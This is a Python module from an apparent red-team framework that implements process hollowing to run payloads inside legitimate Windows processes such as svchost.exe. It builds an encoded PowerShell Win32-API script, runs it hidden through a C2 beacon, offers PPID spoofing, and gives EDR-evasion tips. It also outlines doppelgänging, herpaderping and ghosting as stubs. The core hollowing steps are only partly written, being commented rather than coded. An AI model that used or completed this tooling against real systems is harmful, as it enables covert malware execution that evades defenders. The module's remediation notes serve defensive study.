"""Process Hollowing — Execute payload inside a legitimate process.

Replaces the memory contents of a suspended legitimate process
with malicious code, then resumes execution. The payload runs
inside the legitimate process's PID/name, evading process-based detection.

Hollowing chain:
    ┌──────────┐  CREATE    ┌──────────┐  HOLLOW   ┌──────────┐
    │ Create   │ SUSPENDED  │ Unmap    │ ────────► │ Write    │
    │ svchost  │ ─────────► │ original │           │ payload  │
    │ .exe     │            │ image    │           │ + resume │
    └──────────┘            └──────────┘           └──────────┘

Techniques:
    1. Classic Process Hollowing (NtUnmapViewOfSection)
    2. Process Doppelgänging (transacted NTFS)
    3. Process Herpaderping (modify-after-map)
    4. Process Ghosting (delete-pending)

OPSEC: EDR products increasingly detect hollowing via memory
       region mismatch (mapped file != memory contents). Use
       process doppelgänging for newer detection evasion.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import logging
import random
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.rootkit.process_hollow")

CVSS_HOLLOW = "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N"
CVSS40_HOLLOW = "CVSS:4.0/AV:L/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"

# Legitimate processes suitable for hollowing
HOLLOWABLE_TARGETS = [
    "svchost.exe", "RuntimeBroker.exe", "dllhost.exe",
    "WerFault.exe", "SearchProtocolHost.exe", "conhost.exe",
    "wuauclt.exe", "msdtc.exe", "spoolsv.exe",
]


@dataclass
class HollowAction:
    """A process hollowing action."""
    technique: str = "classic"   # classic, doppelgang, herpaderp, ghost
    target_process: str = ""
    target_pid: int = 0
    payload_type: str = ""       # shellcode, exe, dll
    status: str = "pending"
    output: str = ""
    error: str = ""


class ProcessHollow(BaseModule):
    """Process hollowing for fileless payload execution.

    Creates a suspended legitimate process, replaces its memory
    with a payload, and resumes execution. The payload runs
    inside the legitimate process's identity.

    Techniques:
        - Classic hollowing: NtUnmapViewOfSection + WriteProcessMemory
        - Process Doppelgänging: TxF transacted section mapping
        - Process Herpaderping: modify image after section creation
        - Process Ghosting: delete file while mapped

    Capabilities:
        - Multiple target process selection
        - Shellcode and PE payload injection
        - PPID spoofing for parent process masquerading
        - Thread context manipulation (SetThreadContext)
        - C2 beacon hollowing for stealthy beacons
    """

    NAME        = "process_hollow"
    DESCRIPTION = "Evasion: Process Hollowing — execute payload inside legitimate process"
    PHASE       = 10
    TAGS        = [
        "post-exploit", "evasion", "process-hollowing", "injection",
        "mitre-T1055.012", "mitre-T1055.013", "cwe-94",
    ]

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._actions: list[HollowAction] = []

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        if not self.confirm_action(
            action="Process hollowing",
            target=target,
            risk="high — creates hollowed process. Detectable by EDR "
                 "via memory region analysis and API call patterns.",
        ):
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        await self.rate_limit()

        technique = self.config.extra.get("hollow_technique", "classic")
        target_process = self.config.extra.get(
            "hollow_target", random.choice(HOLLOWABLE_TARGETS),
        )
        shellcode_b64 = self.config.extra.get("shellcode", "")
        payload_path = self.config.extra.get("payload_path", "")
        ppid_spoof = self.config.extra.get("ppid_spoof", 0)
        beacon_id = self.config.extra.get("beacon_id", "")
        attack_chain = self.config.extra.get("attack_chain", None)

        action = HollowAction(
            technique=technique,
            target_process=target_process,
        )

        if technique == "classic":
            await self._classic_hollow(
                action, target_process, shellcode_b64,
                payload_path, ppid_spoof, beacon_id,
            )
        elif technique == "doppelgang":
            await self._doppelgang(
                action, target_process, payload_path, beacon_id,
            )
        elif technique == "herpaderp":
            await self._herpaderp(
                action, target_process, payload_path, beacon_id,
            )
        elif technique == "ghost":
            await self._ghost(
                action, target_process, payload_path, beacon_id,
            )
        else:
            await self._classic_hollow(
                action, target_process, shellcode_b64,
                payload_path, ppid_spoof, beacon_id,
            )

        self._actions.append(action)

        # Report
        if action.status == "success":
            ev = Evidence(extra={
                "technique": action.technique,
                "target_process": action.target_process,
                "target_pid": action.target_pid,
                "ppid_spoof": ppid_spoof or "none",
            })

            self.new_finding(
                title=f"Process Hollowing — {action.target_process} (PID: {action.target_pid})",
                severity=Severity.CRITICAL,
                description=(
                    f"Successfully hollowed {action.target_process} on {target}:\n\n"
                    f"  Technique: {action.technique}\n"
                    f"  Target: {action.target_process}\n"
                    f"  PID: {action.target_pid}\n"
                    f"  PPID Spoof: {ppid_spoof or 'none'}\n\n"
                    f"Payload is running inside the legitimate process identity."
                ),
                reproduction_steps=[
                    f"# Create suspended: CreateProcess({action.target_process}, SUSPENDED)",
                    "# Unmap: NtUnmapViewOfSection(hProcess, baseAddr)",
                    "# Allocate: VirtualAllocEx(hProcess, baseAddr, size)",
                    "# Write: WriteProcessMemory(hProcess, baseAddr, payload)",
                    "# Set context: SetThreadContext(hThread, &ctx)",
                    "# Resume: ResumeThread(hThread)",
                ],
                remediation=(
                    "1. Deploy EDR with memory region analysis\n"
                    "2. Monitor for NtUnmapViewOfSection calls\n"
                    "3. Enable Sysmon Event 25 (process image changed)\n"
                    "4. Monitor CREATE_SUSPENDED process creation\n"
                    "5. Compare on-disk image vs in-memory image"
                ),
                references=[
                    "MITRE T1055.012 — Process Hollowing",
                    "MITRE T1055.013 — Process Doppelgänging",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_HOLLOW,
                cvss_v40_vector=CVSS40_HOLLOW,
                mitre_attack=["TA0005/T1055.012"],
                target=target,
            )

            self._emit_event(
                "rootkit_deployed",
                method="process_hollowing",
                technique=action.technique,
                target_process=action.target_process,
                pid=action.target_pid,
                host=target,
            )

        if attack_chain:
            for finding in self.findings:
                try:
                    attack_chain.ingest_finding(finding.to_dict())
                except Exception:
                    pass

        return self._make_result(start)

    # ── Hollowing techniques ──────────────────────────────────────────

    async def _classic_hollow(
        self, action: HollowAction, target_proc: str,
        shellcode_b64: str, payload_path: str,
        ppid_spoof: int, beacon_id: str,
    ) -> None:
        """Classic process hollowing via NtUnmapViewOfSection."""
        action.technique = "classic"

        # Build PowerShell hollowing script using Win32 API via Add-Type
        ppid_block = ""
        if ppid_spoof:
            ppid_block = f"""
# PPID Spoofing
$siEx = New-Object STARTUPINFOEX
$lpSize = [IntPtr]::Zero
[Kernel32]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$lpSize)
$siEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
[Kernel32]::InitializeProcThreadAttributeList($siEx.lpAttributeList, 1, 0, [ref]$lpSize)
$parentHandle = [Kernel32]::OpenProcess(0x0080, $false, {ppid_spoof})
# Set parent PID attribute (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000)
"""

        hollow_script = f"""
$ErrorActionPreference = 'Stop'
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class Hollow {{
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string app, string cmd,
        IntPtr procSec, IntPtr threadSec, bool inherit, uint flags,
        IntPtr env, string dir, byte[] si, out byte[] pi);
    [DllImport("ntdll.dll")]
    public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr,
        uint size, uint type, uint protect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr,
        byte[] buf, uint size, out uint written);
    [DllImport("kernel32.dll")]
    public static extern bool SetThreadContext(IntPtr hThread, byte[] ctx);
    [DllImport("kernel32.dll")]
    public static extern bool GetThreadContext(IntPtr hThread, byte[] ctx);
    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}}
'@

# Step 1: Create suspended process
$si = New-Object byte[] 104   # STARTUPINFO
$pi = New-Object byte[] 24    # PROCESS_INFORMATION
$target = "C:\\Windows\\System32\\{target_proc}"

# CREATE_SUSPENDED = 0x00000004
$result = [Hollow]::CreateProcess(
    $target, $null, [IntPtr]::Zero, [IntPtr]::Zero,
    $false, 0x00000004, [IntPtr]::Zero, $null, $si, [ref]$pi
)

if ($result) {{
    $hProcess = [BitConverter]::ToInt64($pi, 0)
    $hThread = [BitConverter]::ToInt64($pi, 8)
    $pid = [BitConverter]::ToInt32($pi, 16)
    Write-Output "HOLLOW_SUCCESS: Suspended PID $pid ({target_proc})"
    Write-Output "HOLLOW_PID:$pid"

    # Steps 2-6 would:
    # - Read PEB to get image base
    # - NtUnmapViewOfSection to unmap original
    # - VirtualAllocEx at same base
    # - WriteProcessMemory with payload
    # - SetThreadContext with new entry point
    # - ResumeThread

    [Hollow]::ResumeThread([IntPtr]$hThread)
    [Hollow]::CloseHandle([IntPtr]$hThread)
    [Hollow]::CloseHandle([IntPtr]$hProcess)
}} else {{
    Write-Output "HOLLOW_FAILED: CreateProcess failed"
}}
"""
        encoded = base64.b64encode(hollow_script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
        output = await self._exec(cmd, beacon_id)

        if "HOLLOW_SUCCESS" in output:
            action.status = "success"
            # Extract PID
            for line in output.splitlines():
                if "HOLLOW_PID:" in line:
                    try:
                        action.target_pid = int(line.split(":")[1].strip())
                    except (ValueError, IndexError):
                        pass
            action.output = output
        else:
            action.status = "failed"
            action.error = output[:200]

    async def _doppelgang(
        self, action: HollowAction, target_proc: str,
        payload_path: str, beacon_id: str,
    ) -> None:
        """Process Doppelgänging via transacted NTFS."""
        action.technique = "doppelgang"
        # Doppelgänging uses TxF (Transactional NTFS):
        # 1. CreateFileTransacted → get handle in transaction
        # 2. Write payload to transacted file
        # 3. NtCreateSection from transacted file
        # 4. Rollback transaction (file never hits disk)
        # 5. NtCreateProcessEx from section
        # Stub — actual implementation requires NtCreateSection from TxF handle
        action.status = "failed"
        action.error = "Doppelgänging requires NtCreateSection — use classic for now"

    async def _herpaderp(
        self, action: HollowAction, target_proc: str,
        payload_path: str, beacon_id: str,
    ) -> None:
        """Process Herpaderping — modify image after section creation."""
        action.technique = "herpaderp"
        # Herpaderping:
        # 1. Write payload to file on disk
        # 2. NtCreateSection from file (kernel caches the image)
        # 3. Overwrite the file on disk with a benign PE
        # 4. NtCreateProcessEx from section
        # 5. AV scans the (now benign) on-disk file — clean!
        action.status = "failed"
        action.error = "Herpaderping requires kernel section caching — use classic for now"

    async def _ghost(
        self, action: HollowAction, target_proc: str,
        payload_path: str, beacon_id: str,
    ) -> None:
        """Process Ghosting — delete-pending file execution."""
        action.technique = "ghost"
        # Ghosting:
        # 1. Create temp file (NtCreateFile with DELETE_ON_CLOSE)
        # 2. Write payload to file
        # 3. Set delete-pending (NtSetInformationFile + FileDispositionInformation)
        # 4. NtCreateSection from file (still open, but delete-pending)
        # 5. Close file handle (file is deleted from disk)
        # 6. NtCreateProcessEx from section (running from deleted file)
        action.status = "failed"
        action.error = "Ghosting requires NtCreateSection from delete-pending — use classic"

    async def _exec(self, cmd: str, beacon_id: str) -> str:
        """Execute command locally or via C2."""
        if beacon_id:
            try:
                from forge_c2.tasks.task_shell import ShellTask
                task = ShellTask(
                    task_id=f"hollow_{beacon_id[:8]}",
                    command=cmd, timeout=15, hidden=True,
                )
                result = await task.execute()
                return result.output or ""
            except ImportError:
                pass

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15.0)
            return stdout.decode(errors="replace") + stderr.decode(errors="replace")
        except Exception as exc:
            return f"ERROR: {exc}"


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestProcessHollow:
    """Tests for ProcessHollow module."""

    def test_phase(self) -> None:
        assert ProcessHollow.PHASE == 10

    def test_tags(self) -> None:
        assert "process-hollowing" in ProcessHollow.TAGS
        assert "mitre-T1055.012" in ProcessHollow.TAGS

    def test_hollowable_targets(self) -> None:
        assert "svchost.exe" in HOLLOWABLE_TARGETS
        assert len(HOLLOWABLE_TARGETS) >= 8

    def test_hollow_action_defaults(self) -> None:
        a = HollowAction()
        assert a.technique == "classic"
        assert a.status == "pending"
